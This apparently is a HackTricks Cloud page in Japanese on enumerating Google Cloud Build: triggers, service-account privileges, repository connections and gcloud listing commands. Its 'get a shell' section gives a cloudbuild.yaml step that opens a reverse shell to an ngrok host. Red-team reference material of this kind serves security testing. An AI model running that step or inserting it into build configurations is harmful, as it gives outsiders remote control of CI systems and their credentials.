# GCP - Cloud Build Enum

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝する**か**HackTricksをPDFでダウンロードする**には、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)で**フォロー**する
- ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する

</details>

## 基本情報

Google Cloud Buildは、**ソースコードリポジトリと統合**し、**幅広いプログラミング言語をサポート**する、**ソフトウェアビルドとリリースプロセスを自動化**するマネージドCI/CDプラットフォームです。**開発者がコードを自動的にビルド、テスト、デプロイ**できるようにし、ビルドステップやワークフローをカスタマイズできます。

各Cloud Buildトリガーは、**Cloudリポジトリに関連付けられているか、外部リポジトリ（Github、Bitbucket、Gitlab）と直接接続されています**。

{% hint style="success" %}
ここからまたはCloudリポジトリからGithub/Bitbucketトークンを盗む方法は見当たりませんでした。リポジトリがダウンロードされると、[https://source.cloud.google.com/](https://source.cloud.google.com/)のURLを介してアクセスされ、Githubはクライアントによってアクセスされません。
{% endhint %}

### イベント

Cloud Buildは、次の場合にトリガーされます：

- **ブランチにプッシュ**：ブランチを指定
- **新しいタグをプッシュ**：タグを指定
- **プルリクエスト**：PRを受け取るブランチを指定
- **手動呼び出し**
- **Pub/Subメッセージ**：トピックを指定
- **Webhookイベント**：HTTPS URLを公開し、リクエストは秘密で認証される必要があります

### 実行

3つのオプションがあります：

- 実行するコマンドを指定するyaml/json。通常は：`/cloudbuild.yaml`
- WebコンソールとCLIで「インライン」で指定できる唯一のもの
  - 最も一般的なオプション
  - 認証されていないアクセスに関連する
- ビルドするための**Dockerfile**
- ビルドするための**Buildpack**

### SA権限

**サービスアカウントには`cloud-platform`スコープがあり**、**すべての特権を使用**できます。**SAが指定されていない場合**（submitを行うときのように）、**デフォルトのSA** `<proj-number>@cloudbuild.gserviceaccount.com` が**使用されます**。

デフォルトでは権限が与えられていませんが、簡単に権限を与えることができます：

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

### 承認

Cloud Buildを構成して、ビルドの実行に**承認が必要**なようにすることができます（デフォルトでは無効）。

### PR承認

トリガーがPRの場合、**誰でもパブリックリポジトリにPRを行うことができる**ため、**どのPRでもトリガーの実行を許可するのは非常に危険**です。そのため、デフォルトでは、実行は**所有者と共同作業者に対してのみ自動的**に行われ、他のユーザーのPRでトリガーを実行するには、所有者または共同作業者が`/gcbrun`とコメントする必要があります。

<figure><img src="../../../.gitbook/assets/image (339).png" alt="" width="563"><figcaption></figcaption></figure>

### 接続とリポジトリ

接続は以下で作成できます：

- **GitHub：** Githubトークンを取得するために**OAuthプロンプトが表示**され、**Secret Manager**内に保存される
- **GitHub Enterprise：** **GithubApp**をインストールするように求められます。GitHub Enterpriseホストからの**認証トークン**が作成され、このプロジェクト内に**Secret Manager**シークレットとして保存されます。
- **GitLab / Enterprise：** **APIアクセストークンとRead APIアクセストークン**を提供する必要があり、**Secret Manager**に保存されます。

接続が生成されると、Githubアカウントがアクセス権を持つリポジトリを**リンクする**ことができます。

このオプションは、次のボタンを介して利用できます：

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
この方法で接続されたリポジトリは、**2世代を使用するトリガーでのみ利用可能**です。
{% endhint %}

### リポジトリの接続

これは**`接続`**とは異なります。これにより、**異なる**方法で**GithubまたはBitbucket**リポジトリにアクセスできますが、**接続オブジェクトは生成されません**。ただし、リポジトリオブジェクト（1世代）は生成されます。

このオプションは、次のボタンを介して利用できます：

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

### ストレージ

時々、Cloud Buildはトリガーのためにファイルを保存するための**新しいストレージを生成**します。これは、GCPが提供する例で発生します。
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
### シェルを取得
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
```plaintext
Install gcloud inside cloud build:
```

```plaintext
クラウドビルド内でgcloudをインストールします：
```
```bash
# https://stackoverflow.com/questions/28372328/how-to-install-the-google-cloud-sdk-in-a-docker-image
curl https://dl.google.com/dl/cloudsdk/release/google-cloud-sdk.tar.gz > /tmp/google-cloud-sdk.tar.gz
mkdir -p /usr/local/gcloud
tar -C /usr/local/gcloud -xvf /tmp/google-cloud-sdk.tar.gz
/usr/local/gcloud/google-cloud-sdk/install.sh
```
### 列挙

**ビルド構成とログに機密情報が含まれている可能性があります**。
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### 特権昇格

{% content-ref url="../gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### 認証されていないアクセス

{% content-ref url="../gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### 攻撃後の処理

{% content-ref url="../gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong>を使って、ゼロからヒーローまでAWSハッキングを学びましょう！</summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)を**フォロー**する
- **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のGitHubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する

</details>
